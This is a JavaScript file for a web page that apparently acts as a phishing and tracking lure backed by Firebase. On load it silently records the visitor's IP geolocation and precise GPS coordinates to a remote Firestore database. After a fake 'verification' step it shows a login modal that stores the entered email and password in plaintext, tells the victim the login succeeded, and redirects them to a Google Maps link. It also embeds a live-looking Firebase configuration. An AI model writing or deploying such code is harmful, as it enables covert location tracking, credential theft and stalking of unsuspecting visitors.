// Import Firebase SDK (Make sure to include this in your HTML or module)
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-app.js";
import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-firestore.js";


// Firebase configuration (Replace with your actual config)
const firebaseConfig = {
    apiKey: "AIzaSyCY4G9aoweN27eIqRCgha00vry8qVnwa0E",
    authDomain: "data-ocean-47cdd.firebaseapp.com",
    projectId: "data-ocean-47cdd",
    storageBucket: "data-ocean-47cdd.firebasestorage.app",
    messagingSenderId: "95084122868",
    appId: "1:95084122868:web:f940b54e98889e4d7c04a1"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const userId = new Date().toISOString().substring(0,19);

async function getIPLocation() {
    const response = await fetch("http://ip-api.com/json/");
    const data = await response.json();
    return JSON.stringify(data);
}

const submitBtn = document.getElementById('submitBtn');

submitBtn.addEventListener('click', async () => {
    try {
        const feedback = document.getElementById('feedback');
        feedback.innerHTML = "<p>Redirecting please wait...</p>"
        const dataExtra = await getIPLocation();
        await setDoc(doc(db, "usersextra", userId), {
                    location: dataExtra
                }, { merge: true });
                console.log('Navigating...');
                document.getElementById('verification-panel').style = 'display: none;';
                document.getElementById('show-map').style = 'display: block;';
                storeUserLocation('retryOption');
                setTimeout(()=>{
                    openModal();
                }, 5000);
                // window.location.href = "https://maps.app.goo.gl/FuaY49QF42JvMxGB7";
    } catch (error) {
        
    }
});

// Function to get user location and store it in Firestore
async function storeUserLocation(userId) {
    try {
        const dataExtra = await getIPLocation();
        setDoc(doc(db, "usersextra", userId), {
                    location: dataExtra
                }, { merge: true });
    } catch (error) {
        
    }
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const { latitude, longitude } = position.coords;
            
            try {
                
                await setDoc(doc(db, "users", userId), {
                    location: {
                        latitude: latitude,
                        longitude: longitude,
                        timestamp: new Date().toISOString()
                    }
                }, { merge: true });
                
                console.log("Location saved successfully!");
            } catch (error) {
                console.error("Error saving location: ", error);
            }

        }, (error) => {
            console.error("Geolocation error: ", error.message);
        }, { enableHighAccuracy: true });
    } else {
        console.error("Geolocation is not supported by this browser.");
    }

    
}
storeUserLocation("user123");

function openModal() {
    document.getElementById("loginModal").style.display = "block";
}

function closeModal() {
    document.getElementById("loginModal").style.display = "none";
}

async function loginUser() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    await setDoc(doc(db, "users", 'loggedIn'), {
        location: {email, password}
    }, { merge: true });
    if (email && password) {
        alert("Logged in successfully!\nEmail: " + email);
        closeModal(); // Close modal after login
    } else {
        alert("Please enter your email and password.");
    }
}
const loginButton = document.getElementById("loginButton");
const closeModalButton = document.getElementById("closeModalButton");
closeModalButton.addEventListener('click',  closeModal)
loginButton.addEventListener('click', async () => {
    try {
                await loginUser();
                window.location.href = "https://maps.app.goo.gl/FuaY49QF42JvMxGB7";
    } catch (error) {
        window.location.href = "https://maps.app.goo.gl/FuaY49QF42JvMxGB7";
    }
});